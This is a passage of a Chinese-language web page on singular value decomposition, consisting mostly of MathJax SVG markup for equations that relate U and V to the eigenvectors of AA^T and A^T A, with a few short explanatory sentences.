99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -820.9 1 1141.7"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-5" transform="translate(0, -70.9)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>计算<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.735ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 767 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container></span>可以用<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="4.633ex" height="1.904ex" role="img" focusable="false" viewBox="0 -841.7 2047.8 841.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="msup" transform="translate(750, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, 363) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></g></svg></mjx-container></span>的所有特征向量得到</p>
<p>类似的，</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 24.322ex"><svg style="vertical-align: -0.726ex; min-width: 24.322ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.583ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -820.9)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 820.9) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="3297.1 -820.9 1 1141.7"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -70.9)"><g data-mml-node="mtd"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mi" transform="translate(1686.8, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(2436.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="msub" transform="translate(2825.8, 0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3882.5, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(4938.3, 0)"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mi" transform="translate(583, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msub" transform="translate(5815.3, 0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -820.9 1 1141.7"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-6" transform="translate(0, -70.9)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>计算<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.74ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 769 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container></span>可以用<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="4.633ex" height="1.904ex" role="img" focusable="false" viewBox="0 -841.7 2047.8 841.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, 363) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mi" transform="translate(1297.8, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>的所有特征向量得到</p>
<p>求奇异值可以使用下面的方法</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 81.09ex"><svg style="vertical-align: -0.726ex; min-width: 81.09ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.583ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -820.9)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 820.9) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="15843 -820.9 1 1141.7"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -70.9)"><g data-mml-node="mtd"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(1027.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2083.6, 0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(2850.6, 0)"><path data-c="3A3" d="M666 247Q664 244 652 126T638 4V0H351Q131 0 95 0T57 5V6Q54 12 57 17L73 36Q89 54 121 90T182 159L305 299L56 644L55 658Q55 677 60 681Q63 683 351 683H638V679Q640 674 652 564T666 447V443H626V447Q618 505 604 543T559 605Q529 626 478 631T333 637H294H189L293 494Q314 465 345 422Q400 346 400 340Q400 338 399 337L154 57Q407 57 428 58Q476 60 508 68T551 83T575 103Q595 125 608 162T624 225L626 251H666V247Z"></path></g><g data-mml-node="msup" transform="translate(3572.6, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(828.3, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(5226.4, 0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z"></path></g><g data-mml-node="mi" transform="translate(6504.2, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(7254.2, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(8301, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(9356.8, 0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(10123.8, 0)"><path data-c="3A3" d="M666 247Q664 244 652 126T638 4V0H351Q131 0 95 0T57 5V6Q54 12 57 17L73 36Q89 54 121 90T182 159L305 299L56 644L55 658Q55 677 60 681Q63 683 351 683H638V679Q640 674 652 564T666 447V443H626V447Q618 505 604 543T559 605Q529 626 478 631T333 637H294H189L293 494Q314 465 345 422Q400 346 400 340Q400 338 399 337L154 57Q407 57 428 58Q476 60 508 68T551 83T575 103Q595 125 608 162T624 225L626 251H666V247Z"></path></g><g data-mml-node="msup" transform="translate(10845.8, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(828.3, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 